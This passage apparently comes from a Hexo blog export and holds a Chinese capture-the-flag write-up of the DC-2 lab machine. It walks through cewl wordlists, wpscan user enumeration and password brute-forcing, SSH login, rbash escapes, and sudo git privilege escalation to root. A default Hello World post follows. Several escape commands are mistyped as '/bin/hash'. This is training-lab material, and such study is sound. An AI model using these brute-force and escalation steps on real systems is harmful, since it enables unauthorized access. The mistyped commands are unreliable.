src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/11.png" alt="11"><br>现在我们可以去生成密码字典了，生成位置默认为当前目录，当然也可以自己设置</p><p>命令：<br><code>cewl http://dc-2/ -w dict.txt #dict.txt为自命名文件</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/12.png" alt="12"><br>现在有了密码，还差账号，这时候需要用到另一个工具</p><h2 id="获取站点用户名"><a href="#获取站点用户名" class="headerlink" title="获取站点用户名"></a>获取站点用户名</h2><p>WPScan是一款专门针对Wordpress网站的漏洞扫描工具，它还可以实现获取站点用户名。<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/13.png" alt="13"><br> 命令：<br> <code>wpscan --url dc-2 -e u</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/14.png" alt="14"><br>成功找到了三个用户，现在用户和密码字典都有了，我们可以开始爆破了。</p><h2 id="爆破密码"><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h2><p>依旧是用WPScan，把用户名装到txt文件里面去</p><p>命令：<br><code>wpscan --url dc-2 -U name.txt -P dict.txt</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/15.png" alt="15"><br>成功爆出了jerry用户和tom用户的密码</p><p>现在去登录</p><p>在jerry用户的ALL Pages页面下找到了flag2<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/16.png" alt="16"><br>Flag2文件提示……还不如不提示<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/17.png" alt="17"></p><h1 id="四、SSH登录"><a href="#四、SSH登录" class="headerlink" title="四、SSH登录"></a>四、SSH登录</h1><p>前面在信息收集的时候，得到了SSH端口为7744，而不是默认的22，这一点要注意</p><p>经过尝试jerry不行，tom可以<br><code>ssh tom@192.168.211.132 -p 7744</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/18.png" alt="18"><br>进入账号后第一件事就是查看当前权限<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/19.png" alt="19"></p><h2 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h2><h3 id="关于rbash："><a href="#关于rbash：" class="headerlink" title="关于rbash："></a>关于rbash：</h3><h3 id="1-rbash是什么？"><a href="#1-rbash是什么？" class="headerlink" title="1.rbash是什么？###"></a>1.rbash是什么？###</h3><p>rbash是Restricted bash缩写,即受限制的bash。 管理员可通过指定普通用户的bash为rbash,以此来限制相关操作。简单来说，区别于一般的shell，它会限制一些行为，让一些命令无法执行。</p><h3 id="2-设置rbash"><a href="#2-设置rbash" class="headerlink" title="2.设置rbash"></a>2.设置rbash</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cp  /bin/bash  /bin/rbash  #复制一个bash，重命名为rbash</span><br><span class="line"> </span><br><span class="line">useradd -s  /bin/rbash  tom  #设置用户tom登陆的shell为rbash</span><br><span class="line"> </span><br><span class="line">mkdir -p  /home/tom/.bin  #在tom用户下新建一个.bin目录存放可以执行的命令</span><br></pre></td></tr></table></figure><p>关于rbash的逃逸方法：<br><a href="https://blog.csdn.net/qq_43168364/article/details/111830233">rbash逃逸方法</a><br>现在我们确定一下在rbash的限制下，有哪些命令是可用的</p><p>查看环境变量<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/20.png" alt="20"><br>查看环境下可用命令<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/21.png" alt="21"></p><h3 id="rbash的逃逸"><a href="#rbash的逃逸" class="headerlink" title="rbash的逃逸"></a>rbash的逃逸</h3><p>这里有两种可用</p><h3 id="1-使用vi（vim）命令，设置shell"><a href="#1-使用vi（vim）命令，设置shell" class="headerlink" title="1.使用vi（vim）命令，设置shell"></a>1.使用vi（vim）命令，设置shell</h3><p>命令vi进入编辑界面，写入</p><p>:set shell&#x3D;&#x2F;bin&#x2F;bash</p><p>:shell</p><p>加入后回车，当看见退出了vi编辑器就说明成功了<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/22.png" alt="22"><br>这时候查看可用命令<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/23.png" alt="23"><br>依旧不能，这是因为没有设置环境变量，系统找不到该用的shell</p><p>添加以下两条路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin/</span><br></pre></td></tr></table></figure><p><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/24.png" alt="24"><br>这时候就可以明确看到环境变量发生了改变</p><h3 id="2-利用bash-cmds自定义一个shell"><a href="#2-利用bash-cmds自定义一个shell" class="headerlink" title="2.利用bash_cmds自定义一个shell"></a>2.利用bash_cmds自定义一个shell</h3><p>BASH_CMDS[X]&#x3D;&#x2F;bin&#x2F;hash</p><p>执行x的时候就相当于在执行shell<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/25.png" alt="25"><br>这个同样是需要设置环境变量，这里就不再赘述</p><p>获得命令权限后，我们寻找下一个flag<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/26.png" alt="26"><br>找到flag3，提示su</p><p>su是切换账户的命令，现在我们唯一另外的账户就是jerry，试试吧</p><p>账号：jerry 密码：adipiscing</p><p>密码来自于前面WPScan爆破所得<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/27.png" alt="27"><br>看权限<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/28.png" alt="28"><br>查找下一个flag<br><code>find / -name &#39;*flag*&#39;</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/29.png" alt="29"><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/30.png" alt="30"><br>Flag4提示git，应该是要提权，一般最后一个flag都是提权到root</p><h1 id="五、提权"><a href="#五、提权" class="headerlink" title="五、提权"></a>五、提权</h1><p>在DC-1靶机中我们使用了SUID提权，先试试吧</p><h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>命令：利用find命令，找查具有SUID权限的可执行二进制文件<br><code>find / -perm -u=s -type f 2&gt;/dev/null</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/31.png" alt="31"><br>确实没找到什么有用的命令，find也没有</p><p>那就看看当前哪些能使用root权限吧，命令：<br><code>sudo -l</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/32.png" alt="32"><br>Git可以</p><h2 id="git提权"><a href="#git提权" class="headerlink" title="git提权"></a>git提权</h2><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><p>命令：<br><code>sudo git help config</code><br>回车然后输入：<br><code>!/bin/hash</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/33.png" alt="33"><br>成功</p><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><p>命令：<br><code>sudo git -p help</code><br>回车然后输入：<br><code>!/bin/hash</code><br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/34.png" alt="34"><br>现在找寻最后一个flag吧<br><img src="/Water-melon.github.io/2024/09/14/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9ADC-1%E9%9D%B6%E6%9C%BA/35.png" alt="35"><br>完结撒花<del>最后来一个海琴烟的全图</del> </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/Water-melon.github.io/2024/09/13/hello-world/"/>
      <url>/Water-melon.github.io/2024/09/13/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>friends</title>
      <link href="/Water-melon.github.io/friends/index.html"/>
      <url>/Water-melon.github.io/friends/index.html</url>
      
        <content type="html"><![CDATA[<h1 id="友链交换"><a href="#友链交换" class="headerlink" title="友链交换"></a>友链交换</h1><p>想要交换友链的小伙伴，欢迎在留言板留言，留言格式：</p><ul><li><strong>名称：</strong>你的博客名称</li><li><strong>地址：</strong>你的博客地址</li><li><strong>简介：</strong>一句话简介</li></ul><p>例如我的博客友链，大家可以加到自己博客里哦：</p><ul><li><strong>名称：</strong>Watermelon</li><li><strong>地址：</strong><a href="https://3watermelon.github.io/Water-melon.github.io/">https://3watermelon.github.io/Water-melon.github.io/</a></li><li><strong>简介：</strong>远方滚来了一个西瓜</li></ul>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/Water-melon.github.io/categories/index.html"/>
      <url>/Water-melon.github.io/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/Water-melon.github.io/tags/index.html"/>
      <url>/Water-melon.github.io/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友情链接</title>
      <link href="/Water-melon.github.io/link/index.html"/>
      <url>/Water-melon.github.io/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于作者</title>
      <link href="/Water-melon.github.io/about/index.html"/>
      <url>/Water-melon.github.io/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
